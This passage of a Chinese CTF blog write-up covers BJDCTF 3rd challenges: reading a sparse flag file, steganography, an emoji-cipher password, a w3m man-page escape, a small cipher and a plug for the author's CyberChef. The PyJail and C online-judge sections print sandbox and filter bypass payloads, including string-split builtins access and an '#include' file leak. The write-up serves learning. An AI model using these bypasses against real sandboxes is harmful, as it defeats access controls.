但同一命名空间的同一名字生成的UUID相同.</p></li><li><p>uuid.uuid4() : 基于随机数</p><p>通过随机数来生成UUID. 使用的是伪随机数有一定的重复概率. </p></li><li><p>uuid.uuid5(namespace, name) : 基于名字的SHA-1散列值</p><p>通过计算命名空间和名字的SHA-1散列值来生成UUID, 算法与 uuid.uuid3() 相同.</p></li></ol><p>（来自网络）</p></blockquote><p>看来是在 <code>1024*1024*1024*randint(offset,offset+2048)</code> 的随机位置写入了flag。</p><p>再来看看硬盘大小和文件大小。</p><pre class=" language-bash"><code class="language-bash">$ <span class="token function">df</span>Filesystem     1K-blocks    Used Available Use% Mounted onoverlay         16197544 2011556  14169604  13% /tmpfs              65536       0     65536   0% /devtmpfs             507956       0    507956   0% /sys/fs/cgroup/dev/vda1       16197544 2011556  14169604  13% /etc/hostsshm                65536       0     65536   0% /dev/shmtmpfs             507956       0    507956   0% /proc/acpitmpfs             507956       0    507956   0% /proc/scsitmpfs             507956       0    507956   0% /sys/firmware$ <span class="token function">ls</span> -altotal 64drwxr-x--- 1 root ctf            4096 May 22 06:40 <span class="token keyword">.</span>drwxr-xr-x 1 root root           4096 May 19 03:09 <span class="token punctuation">..</span>-rwxr-x--- 1 root ctf             220 May  5  2019 .bash_logout-rwxr-x--- 1 root ctf            3771 May  5  2019 .bashrc-rwxr-x--- 1 root ctf             807 May  5  2019 .profile-rw-r----- 1 root ctf  16150150774793 May 22 06:40 flag-rw-r----- 1 root ctf              23 May 19 11:05 readme</code></pre><p>硬盘这么小，怎么<code>flag</code>文件这么大（16TB+ ？？？），佛了。</p><p>这个 nc 有15s的时间限制，还有执行内存限制之类的。</p><p>试了一下没有<code>strings</code>，<code>grep</code> 出不来 flag。（被kill了？</p><p>考虑到 hint 中提示可以用py来整。环境中只有py2.</p><pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"open('./flag','r').read()"</span></code></pre><p>这样会炸内存。</p><p>考虑分块读取，然而好像又有限制。佛了。</p><hr><p><strong>20200605 更新：</strong></p><p>看了看出题的 TaQini 师傅的<a href="http://taqini.space/2020/05/28/bjd3rd-testyournc/#Test-your-nc" target="_blank" rel="noopener">出题笔记</a>，这里顺便参考一下。</p><p>之所以生成的 flag 如此之大，是因为生成的脚本中的 <code>seek</code> 函数在将文件偏移的指针往后移动一段之后，在写入的有效数据（flag）之间留下了一个个由 <code>\x00</code> 组成的空洞（hole），这些 hole 是不占用（不分配）磁盘空间的。因此题目中用<code>df</code>看硬盘空间还是很小的。</p><p>而用<code>lseek</code>函数能跳过 hole 去读取数据。</p><p>可以用 <code>man lseek</code> 来看看函数手册。</p><blockquote><p><strong>off_t lseek</strong> (int fd, off_t offset, int whence);</p><p>The lseek() function repositions the offset of the open file associated with the file descriptor <u>fd</u> to the argument <u>offset</u> according to the directive <u>whence</u>.</p><p>fd：文件描述符； </p><p>offset: 移动文件位置的偏移数，以字节为单位；</p><p>whence 为系统定义的常量，可能的值有<strong>SEEK_SET</strong>、<strong>SEEK_CUR</strong>、<strong>SEEK_END</strong>、<strong>SEEK_DATA</strong>、<strong>SEEK_HOLE</strong>。</p><p><strong>SEEK_SET</strong><br>       The offset is set to offset bytes.    文件读写位置从<strong>文件开始</strong>往后移动offset个字节。</p><p><strong>SEEK_CUR</strong><br>       The offset is set to its current location plus offset bytes.  文件读写位置从<strong>当前位置</strong>开始移动offset个字节。offset可以为负值。</p><p><strong>SEEK_END</strong><br>       The offset is set to the size of the file plus offset bytes.  文件读写位置从<strong>文件结尾</strong>移动offset个字节。offset可以为负值。</p></blockquote><p>这里要用到的是 <code>whence</code> 参数为 <code>SEEK_DATA</code>，man 中还对空洞（hole）的原理作了解释。</p><blockquote><p>Seeking file data and holes</p><p>​       Since version 3.1, Linux supports the following additional values for whence:</p><p><strong>SEEK_DATA</strong><br>          Adjust the file offset to the next location in the file greater than or equal to offset containing data.  If offset points  to  data,  then the file offset is set to offset.</p><p><strong>SEEK_HOLE</strong><br>          Adjust  the file offset to the next hole in the file greater than or equal to offset.  If offset points into the middle of a hole, then the file offset is set to offset.  If there is no hole past offset, then the file offset is adjusted to the end of the file (i.e., there is  an implicit hole at the end of any file).</p><p>   In both of the above cases, lseek() fails if offset points past the end of the file.</p><p>   These  operations  allow  applications  to map holes in a sparsely allocated file.  This can be useful for applications such as file backup tools, which can save space when creating backups and preserve holes, if they have a mechanism for discovering holes.</p><p>   For the purposes of these operations, a hole is a sequence of zeros that (normally) has not been allocated in the underlying file storage. However, a filesystem is not obliged to report holes, so these operations are not a guaranteed mechanism for mapping the storage space actually allocated to a file.  (Furthermore, a sequence of zeros that actually has been written to the underlying storage may not be reported as a  hole.) In the simplest implementation, a filesystem can support the operations by making SEEK_HOLE always return the offset of the end of the file, and making SEEK_DATA always return offset (i.e., even if the location referred to by offset is a hole, it can be considered to consist of data that is a sequence of zeros).</p></blockquote><p>大概也就是说，这些空洞是零序列，它们通常在底层文件存储中没有分配空间。</p><p><code>SEEK_DATA</code> 是跳过 hole 寻找下一个数据，<code>SEEK_HOLE</code>是跳过数据寻找下一个 hole。</p><p>在 python 中的 os 模块也有<code>lseek</code>这个函数，于是可以用来写exp了。</p><p>考虑到没有环境了，这里利用<code>/f1a9.bak</code>中的内容在本地生成了一个 flag，而后参照 TaQini 师傅的脚本来读取 flag。</p><p>首先看一下 flag 有多大。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># ls -al</span>total 56drwxr-xr-x 2 root root           4096 6月   5 22:06 ./drwxr-xr-x 8 root root           4096 6月   5 21:48 <span class="token punctuation">..</span>/-rw-r--r-- 1 root root 15007689474057 6月   5 21:48 flag</code></pre><p>在命令行可以用 <code>python -c &lt;command&gt;</code> 来执行 py 语句，多行的话用三个引号引起来就完事了<em>（我也才知道命令行也可以这样多行的嘤嘤嘤）</em>。</p><p><strong>Exp：</strong>（在命令行执行）</p><pre class=" language-bash"><code class="language-bash">python -c <span class="token string">""</span>"<span class="token function">import</span> osfd <span class="token operator">=</span> os.open<span class="token punctuation">(</span><span class="token string">'/home/ctf/flag'</span>,0<span class="token punctuation">)</span>off <span class="token operator">=</span> 0flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> off <span class="token operator">&lt;</span> 15007689474057:    off <span class="token operator">=</span> os.lseek<span class="token punctuation">(</span>fd,off,3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># SEEK_DATA</span>    off +<span class="token operator">=</span> 1    a <span class="token operator">=</span> os.read<span class="token punctuation">(</span>fd,1<span class="token punctuation">)</span>    <span class="token keyword">if</span> a <span class="token operator">!=</span> <span class="token string">'\x00'</span><span class="token keyword">:</span>        flag +<span class="token operator">=</span> aprint flag<span class="token string">""</span>"</code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200605234912255.png" alt="nc_flag"></p><p>即可得到flag了！</p><hr><p>这里还有<strong>另一种方法</strong>，那就是利用 <strong>grep 大法</strong>！</p><p>看到有师傅说，用 <code>grep -z</code> 可以单行语句出 flag，不过没有具体给出如何实现，于是就自己试了一下。</p><p>看了看 <code>grep --help</code> 和 <code>man grep</code>：</p><blockquote><p> -z, –null-data           一个 0 字节的数据行，但不是空行</p><p> -z, –null-data<br>              Treat the input as a set of lines, each terminated by <strong>a zero byte</strong> (the ASCII NUL character) instead of a newline.  Like the  -Z  or  –null option, this option can be used with commands like sort -z to process arbitrary file names.</p></blockquote><p><code>-z</code>就是说把零字符看成是输入的分行标志，可以理解是把 <code>\x00</code> 当成分行符，正好就符合这题的意思了，妙呀！</p><p>试了一阵子，发现可以这样来读取 flag 文件：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">grep</span> -z <span class="token string">".\+"</span> flag<span class="token comment" spellcheck="true"># Or</span><span class="token function">grep</span> -z <span class="token string">"."</span> flag</code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200605235717591.png" alt="nc_flag2"></p><p>想不到吧，grep 还能这么用呢。</p><br><hr><h3 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h3><blockquote><p>flag格式：把BJD{this_is_flag}转md5，提交md5值(小写)</p><p><strong>hint:</strong> 第三组密码中的某一位，以下图的解密结果为准：</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/jPqgz2GTi46qq5it.png" alt=""></p><p>百度图片搜出来的密码表是Q，以原著为准 改成w，再根据图片的提示改成W；如果还提交失败就是其他位有解错的。</p></blockquote><p>有个<code>flag.zip</code>，里面有个图片密码加密了。</p><p>这题网页上看到那个 <code>pass</code> 和 <code>word_is_here</code> 之间的空字符还觉得奇怪，做题的时候就没想到是<strong>零宽度字符隐写</strong>（Zero-Width Space Steganography）……原来还有用到网页上的。</p><blockquote><p><strong>解密网站</strong>参考：</p><p><a href="http://zero.rovelast.com/" target="_blank" rel="noopener">http://zero.rovelast.com/</a></p><p><a href="https://offdev.net/demos/zwsp-steg-js" target="_blank" rel="noopener">https://offdev.net/demos/zwsp-steg-js</a></p></blockquote><blockquote><p><strong>GitHub 仓库</strong>参考：</p><p><a href="https://github.com/enodari/zwsp-steg-py" target="_blank" rel="noopener">zwsp-steg-py</a> （基于 python 实现）</p><p><a href="https://github.com/offdev/zwsp-steg-js" target="_blank" rel="noopener">zwsp-steg-js</a>  （基于 JavaScript 实现）</p></blockquote><p>解出来密码是<code>zerowidthcharactersinvisible</code>。</p><p>拿去解压图片，发现文件倒序了。</p><p><em>（留坑，后面接着复现）</em></p><br><hr><h3 id="manual"><a href="#manual" class="headerlink" title="manual"></a>manual</h3><blockquote><p>请使用ssh连接靶机（用户名为ctf，密码详见欢迎信息）———— 歡迎使用BJD3rd帮助手册————「manual一下，你就知道」</p><p>183.129.189.60:10125,10126,10127,10128,10129,10130</p><p>hint0 试试limux的man命令，看看与本题的man文档有何不同</p><p>hint0.5 关于登录密码，试试<a href="http://emoji.taqini.space" target="_blank" rel="noopener">emoji</a>网站的分享功能</p><p>hint1 本题无需提权，请仔细看看根目录下的文件</p><p>hint2 据说会ps的师傅都做出来了</p><p>hint3 f1a9.py的独白：我的真实身份是web server</p></blockquote><p>这题有毒，做了一天没做出来……大概写写吧。</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522204639089.png" alt="ssh login"></p><pre><code>% ssh ctf@183.129.189.60 -p 10128Welcome to BJD3rd Games ~🐀🐾🌴🚜🍋🐊🍇🐂🍓🎑🐈🐟💁🚟🍗The above login passwd is encrypted.leads: - http://emoji.taqini.space - suikaTry to figure out where is your         #           #####   #####  ######  ##     ##   #     # #     ##      # #    #  #  #     #       ######    #   #    #  ######    ###  #        #   ######       #    #    #        #   #    # #     #         #      ##### #    #  #####     #    p.s. Maybe you have lots of xiaowenhao after login,     I will help u look up the manual pages of flag.Now, input passwd to start the game:</code></pre><p><a href="http://emoji.taqini.space" target="_blank" rel="noopener">http://emoji.taqini.space</a> 是 TaQini 师傅部署的 codemoji 加解密网站。</p><p><code>suika</code>在日语中是 <strong>西瓜</strong> 的意思，看来这就是 key 了。</p><p>随意试着加密了一个，在分享界面浏览器抓包得到分享链接形式为</p><p><a href="http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BNi%2FCfjonwn4y38J%2BOkfCfjYvwn46J8J%2BMt%2FCfjpHwn42L8J%2BOifCfjLfwn46RIiwia2V5Ijoi8J%2BNiSJ9" target="_blank" rel="noopener">http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BNi%2FCfjonwn4y38J%2BOkfCfjYvwn46J8J%2BMt%2FCfjpHwn42L8J%2BOifCfjLfwn46RIiwia2V5Ijoi8J%2BNiSJ9</a></p><p><code>data</code> 参数 urldecode + base64 解码后得到</p><pre><code>{"message":"🍋🎉🌷🎑🍋🎉🌷🎑🍋🎉🌷🎑","key":"🍉"}</code></pre><p>于是想到修改<code>message</code>参数构造 payload 如下。</p><pre><code>{"message":"🐀🐾🌴🚜🍋🐊🍇🐂🍓🎑🐈🐟💁🚟🍗","key":"🍉"}</code></pre><p>base64 encode + urlencode:</p><pre><code>eyJtZXNzYWdlIjoi8J%2BQgPCfkL7wn4y08J%2BanPCfjYvwn5CK8J%2BNh%2FCfkILwn42T8J%2BOkfCfkIjwn5Cf8J%2BSgfCfmp%2Fwn42XIiwia2V5Ijoi8J%2BNiSJ9</code></pre><p>构造分享链接得到：</p><p><a href="http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BQgPCfkL7wn4y08J%2BanPCfjYvwn5CK8J%2BNh%2FCfkILwn42T8J%2BOkfCfkIjwn5Cf8J%2BSgfCfmp%2Fwn42XIiwia2V5Ijoi8J%2BNiSJ9" target="_blank" rel="noopener">http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BQgPCfkL7wn4y08J%2BanPCfjYvwn5CK8J%2BNh%2FCfkILwn42T8J%2BOkfCfkIjwn5Cf8J%2BSgfCfmp%2Fwn42XIiwia2V5Ijoi8J%2BNiSJ9</a></p><p>拿去解码。</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522204126571.png" alt="codemoji"></p><p>得到ssh连接密码：</p><p><code>C0dEmOj!so4UnNy</code></p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522204720852.png" alt="man flag"></p><p>还别说，挺好看的233.</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522203813777.png" alt="flag"></p><p>看了 Help 才发现这是 w3m。还带右键菜单的哇！</p><blockquote><p>w3m是个开放源代码的文字式网页浏览器。</p><p>w3m支持表格、框架、SSL连线、颜色。如果是在适当的terminal上，甚至还支持“inline image”。 这个软件通常尽量呈现出网页本来的编排。</p><p>“w3m”这名字是来自“WWW-wo-Miru”，就是日文的“看WWW”之义。</p></blockquote><p>哇是真的浏览器唉，还可以上我博客（雾），虽然解析不了中文嘤嘤嘤。</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522211921981.png" alt="blog"></p><p>借助快捷键<code>U</code>分别访问<code>givemeflag</code>和 <code>getflag</code>。</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522211122635.png" alt="givemeflag"></p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522211335220.png" alt="getflag"></p><p>HISTORY 里给了个网址 <a href="https://www.jianshu.com/p/ac26b4506a38" target="_blank" rel="noopener">https://www.jianshu.com/p/ac26b4506a38</a></p><p>讲的是<strong>自定义man手册</strong>。</p><p>查看<code>/etc/manpath.config</code>文件。</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523125052333.png" alt="manpath.config"></p><p>对比一下好像并没有什么区别（？？？</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523125551959.png" alt="manpath"></p><p>用 <code>V</code> 可以查看文件，但是找不到  <code>f1a9.py</code>？</p><p>Option 里可以改配置用外部浏览器打开，考虑是反弹 shell。</p><p>（不过么有 curl，不会了……嘤嘤嘤</p><p>（看大佬们是用 perl 整的。</p><p>这题后面还有好几步……有空再复现8.</p><p>最后是一个 <a href="http://999.taqini.space" target="_blank" rel="noopener">http://999.taqini.space</a> 太极？会玩。</p><br><hr><h3 id="PY-me"><a href="#PY-me" class="headerlink" title="PY me"></a>PY me</h3><blockquote><p>请提交md5(“BJD{xxxx}”)； </p><p>使用nc连接； 尽量用后面的端口，10020端口不太稳定</p><p>183.129.189.60:10020,10021,10022,10023,10024,10026</p></blockquote><blockquote><p>flag格式为md5（BJD{.*}）上交md5值</p><p>使用nc连接靶机，建议用后面端口号</p><p>hint1: 所有没有使用hint()中给出的函数做出题目的方法都是非预期，如果您是非预期请报告我们，所以 从哪里入手应该懂了吧？</p><p>hint2: if( #s#o#m#e#t#h#i#n#g#<em>#I#</em>#w#o#n#t#<em>#t#e#l#l#</em>#y#o#u# )  这过滤了全部字母和数字，当然还过滤了其他符号，需要自己fuzz（socket pwntool等)</p><p>hint3: python几？</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/X1T9NYXZ6Zyt9xKQ.png" alt=""></p><p>打错字了，是result，不影响做题</p></blockquote><p>题目给了 hint 说<strong>过滤了全部字母和数字，当然还过滤了其他符号</strong>。</p><p>试了发现不仅仅如此，常用的一下函数也被过滤了，比如 <code>os</code>，<code>sys</code>，<code>open</code>，<code>lambda</code>，<code>system</code>，<code>exec</code>，<code>eval</code>，<code>builtins</code>等等。</p><p>函数名称用字符串拼接可以绕过，但不知道用什么方法能绕过来调用函数了。</p><p>看了下 <code>dir()</code>，大概有这几个 <code>False</code>, <code>__builtins__</code> , <code>hint</code>, <code>rceMe</code>。</p><p>题目中的 <code>if False</code>，直接令 <code>False=True</code> 就行，毕竟 python 里都是对象 object 2333.</p><p>本来想改 <code>str</code> 的，但怎么样都绕不过 <code>if( #s#o#m#e#t#h#i#n#g#_#I#_#w#o#n#t#_#t#e#l#l#_#y#o#u# )</code> 这部分判断。</p><p>利用报错知道了源码文件名称为 <code>bjdpyjail.py</code>，不过好像没啥用。</p><p>考虑用字符来绕过，手动试验发现包括但不限于 <code>^.;</code> 被过滤了。</p><blockquote><p>说到这难受死了，有空得学学 <code>pwntools</code>，直接控制台手码代码太jr难受了，还不能快捷调用上一条执行命令，无法接受。</p></blockquote><p>这么说来，异或 <code>^</code> 不行，但取反 <code>~</code> 可以，<code>&lt;</code>  <code>&gt;</code>也可。</p><p>查了一下网上有关于 PHP 的字符绕过，然而在 python 里不能直接对字符本身取反，要先取<code>ord</code>，然后想了半天都想不到该怎么绕了……</p><p><em>（摊手，等复现</em></p><p>赛后看到大佬找到了奇妙的绕过方法，把源码读取出来了。（详见 <a href="https://ytoworld.tk/index.php/archives/100/#PY%20me(%E9%9D%9E%E9%A2%84%E6%9C%9F)" target="_blank" rel="noopener">这里</a> ）</p><pre class=" language-python"><code class="language-python">vars<span class="token punctuation">(</span>locals<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token operator">+</span><span class="token string">'_buil'</span><span class="token operator">+</span><span class="token string">'tins_'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"op"</span><span class="token operator">+</span><span class="token string">"en"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'bjdpyjail.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200524132730843.png" alt="读取源码"></p><p>预期解详见出题师傅 Y1ng 师傅的这一篇：</p><p><a href="https://www.gem-love.com/ctf/2345.html" target="_blank" rel="noopener">[译]PlaidCTF中一道PyJail逃逸题目分析</a></p><br><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="TaQiniOJ-0"><a href="#TaQiniOJ-0" class="headerlink" title="TaQiniOJ-0"></a>TaQiniOJ-0</h3><blockquote><p>欢迎来到TaQini的C语言新手训练营</p><p>（没有附件，盲打）</p><p>183.129.189.60:10075,10076,10077,10078,10079,10080</p></blockquote><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523215022417.png" alt="taqinioj"></p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523215138676.png" alt="oj2"></p><p>这里告诉了flag所在目录为 <code>/home/ctf/flag</code>。</p><p>好久没写C了，突然都忘记文件操作了。被 python 的<code>open</code>惯坏了唉。</p><p>试了一下，还有 defender 唉。<code>flag</code>被过滤了。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/home/ctf/fl"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> tmp<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello TaQini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">"ag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>     fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@</code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523220959266.png" alt="defender"></p><p>发现好像敏感词不仅仅是<code>flag</code>，还有<code>home</code>啥的……然而赛后才发现，气死我了。</p><p>可以<code>sprintf</code>来拼接字符串。</p><p>（想起来某次做项目给单片机编程就靠这玩意拼接字符串，被 python 惯坏的我写的难受死了。</p><pre class=" language-c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token string">"%s%s%s%s%s"</span><span class="token punctuation">,</span> <span class="token string">"/hom"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span><span class="token string">"/ct"</span><span class="token punctuation">,</span> <span class="token string">"f/f"</span><span class="token punctuation">,</span> <span class="token string">"lag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>当然还可以直接用字符数组赋值的方法。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'\0'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>赛后群里有大佬给出了如下的<strong>非预期解</strong>，太佩服了！</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> "/home/ctf/fl\\</span>ag"</code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200524013637088.png" alt="非预期解"></p><p>哇呜，用报错来弹flag！虽然之前写错语法也报错了，但这脑洞真没想到。果然是 OJ 大佬。</p><p>同样漏洞可用于另一个 OJ 题。</p><br><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> A<span class="token punctuation">,</span>SALT<span class="token keyword">from</span> itertools <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        c<span class="token operator">+=</span>hex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> ord<span class="token punctuation">(</span>next<span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> c<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token string">'flag{********************************}'</span>    a <span class="token operator">=</span> A    salt <span class="token operator">=</span> SALT    <span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>salt<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>salt<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    si <span class="token operator">=</span> cycle<span class="token punctuation">(</span>salt<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"明文内容为："</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的密文为："</span><span class="token punctuation">)</span>    c<span class="token operator">=</span>encrypt<span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#加密后的密文为：</span>    <span class="token comment" spellcheck="true">#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d</span></code></pre><p>通过<code>assert</code>可以知道<code>salt</code>是三个字母组成的。</p><p><code>cycle</code>返回一个迭代器 iterator，每一次调用 <code>next</code> 返回下一个字符。</p><p>需要根据 <code>flag{</code>和 <code>}</code> 解出<code>A</code>和<code>SALT</code>，然后再代回去反解 flag 中的字符。取模的话想不到别的方法应该也是爆破解。</p><p>考虑是爆破来解<code>A</code>&amp; <code>SALT</code>，然而我<code>a</code>的爆破范围太大了设到了 1000 然后就没整出来……（（</p><p>赛后看人家大佬解出来<code>A</code>是57，<code>salt</code>是<code>ahh</code>。</p><p><em>（之后再复现8</em></p><br><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>最终的解题情况如下。</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200524011922656.png" alt="解题情况"></p><p>Web 的小红花这么多人解出来，啊是我太菜了。题目把出网流量封了，弹不了shell，赛后看群里大佬们是用时间盲注怼出来的。</p><p>总之，这次题目质量感觉挺高的，难度是真的大得亚批，两天打下来每天都在自闭……</p><p>这次做题思路比较乱，可能也比较佛系，一下看这题一下看那题，噢原来都不会做。<em>（群里萌新又做出来了？？？打扰了。</em></p><p>然后还有大佬两周学会 pwn 然后做出了一堆题，这么容易入门的嘛，心动了。<em>（算了8）</em></p><br><hr><h2 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h2><p>为了便于打 CTF，前天晚上做题途中自己搭了个 CyberChef，我才不会说之前一直想搭但一直没整呢。</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200524144909214.png" alt="CyberChef"></p><p>网址在这里：<a href="https://chef.miaotony.xyz/" target="_blank" rel="noopener">https://chef.miaotony.xyz/</a></p><p><strong>不带各种页面统计，不收集隐私信息，欢迎来玩来 BAKE 呀！</strong></p><p>简而言之，它就是可以处理包括但不限于各种编码各种加密各种转换的一个在线工具，可以把一系列处理流程放进 菜谱 Recipe 里，然后 BAKE 就出结果啦！</p><p>下面是官方的介绍。</p><blockquote><p>The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis</p><p><strong><em>The Cyber Swiss Army Knife</em></strong></p><p>CyberChef is a simple, intuitive web app for carrying out all manner  of “cyber” operations within a web browser. These operations include  simple encoding like XOR or Base64, more complex encryption like AES,  DES and Blowfish, creating binary and hexdumps, compression and  decompression of data, calculating hashes and checksums, IPv6 and X.509  parsing, changing character encodings, and much more.</p><p>The tool is designed to enable both technical and non-technical  analysts to manipulate data in complex ways without having to deal with  complex tools or algorithms. It was conceived, designed, built and  incrementally improved by an analyst in 